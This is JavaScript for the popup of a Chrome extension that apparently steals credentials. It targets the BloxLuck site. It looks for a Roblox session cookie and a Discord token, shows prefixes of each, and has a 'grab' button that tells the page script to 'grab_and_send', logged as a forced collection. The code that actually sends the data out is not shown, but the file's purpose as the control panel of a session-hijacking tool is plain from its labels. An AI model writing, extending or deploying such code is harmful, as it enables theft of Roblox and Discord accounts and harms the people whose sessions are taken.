document.addEventListener('DOMContentLoaded', () => {
  const statusDot = document.getElementById('statusDot');
  const statusText = document.getElementById('statusText');
  const userLabel = document.getElementById('userLabel');
  const robloxStatus = document.getElementById('robloxStatus');
  const discordStatus = document.getElementById('discordStatus');
  const starpetsStatus = document.getElementById('starpetsStatus');
  const logBox = document.getElementById('logBox');
  const grabBtn = document.getElementById('grabBtn');
  const refreshBtn = document.getElementById('refreshBtn');

  function log(msg) {
    logBox.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
  }

  function checkStatus() {
    chrome.tabs.query({ active: true, currentWindow: true }, tabs => {
      if (tabs[0] && tabs[0].url && tabs[0].url.includes('bloxluck.com')) {
        statusDot.className = 'dot g';
        statusText.textContent = 'Connected to BloxLuck';
        
        chrome.tabs.sendMessage(tabs[0].id, { action: 'get_status' }, r => {
          if (r && r.username) {
            userLabel.textContent = '👤 ' + r.username;
          }
        });

        // Check cookie via background
        chrome.runtime.sendMessage({ t: 'g' }, d => {
          if (d && d.r) {
            robloxStatus.textContent = '✓ Cookie found: ' + d.r.substring(0, 30) + '...';
            robloxStatus.className = 'creds found';
          } else {
            robloxStatus.textContent = '✗ No cookie on this page';
            robloxStatus.className = 'creds missing';
          }
        });
      } else {
        statusDot.className = 'dot r';
        statusText.textContent = 'Not on BloxLuck';
        userLabel.textContent = '-';
        robloxStatus.textContent = '✗ Open bloxluck.com first';
        robloxStatus.className = 'creds missing';
      }
    });

    // Try to get Discord status
    chrome.runtime.sendMessage({ t: 'dt' }, d => {
      if (d && d.token) {
        discordStatus.textContent = '✓ Token found: ' + d.token.substring(0, 20) + '...';
        discordStatus.className = 'creds found';
      } else {
        discordStatus.textContent = '✗ No Discord tab open / no token';
        discordStatus.className = 'creds missing';
      }
    });
  }

  grabBtn.onclick = () => {
    chrome.tabs.query({ active: true, currentWindow: true }, tabs => {
      if (tabs[0]) {
        chrome.tabs.sendMessage(tabs[0].id, { action: 'grab_and_send' }, () => {
          log('Force collect sent ✓');
          setTimeout(checkStatus, 1000);
        });
      }
    });
  };

  refreshBtn.onclick = checkStatus;

  // Initial check
  checkStatus();
});
